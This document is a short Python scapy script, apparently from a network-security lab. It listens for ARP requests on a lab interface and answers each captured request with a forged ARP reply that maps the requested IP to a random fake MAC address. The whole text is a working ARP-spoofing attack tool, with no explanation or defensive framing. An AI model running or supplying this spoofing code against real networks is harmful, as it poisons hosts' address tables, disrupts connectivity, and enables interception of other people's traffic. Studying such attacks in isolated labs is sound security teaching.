#!/usr/bin/env python3
from scapy.all import *
import subprocess
from random import randint

def arp_monitor_callback(pkt):
    if ARP in pkt and pkt[ARP].op == 1: #who-has
        fake_mac = "02:00:00:%02x:%02x:%02x" % (randint(0, 255), randint(0, 255), randint(0, 255))
        print("\nARP request from %s %s" % (pkt[ARP].hwsrc, pkt[ARP].psrc))
        ether = Ether(dst=pkt[Ether].src, src=fake_mac, type=pkt[Ether].type)
        arp = ARP(op="is-at", hwsrc = fake_mac, hwdst = pkt[ARP].hwsrc, psrc = pkt[ARP].pdst, pdst = pkt[ARP].psrc, hwlen = pkt[ARP].hwlen, plen = pkt[ARP].plen)
        pkt = ether / arp
        send(pkt, verbose = False)
        print("The following ARP response was sent back:\n")
        ls(pkt)
        print("---------------------------------------------------------------------")

if __name__ == "__main__":
    cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
    IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()
    sniff(iface=IFACE, prn=arp_monitor_callback, filter="arp[6:2] = 1", count = 2, store=0)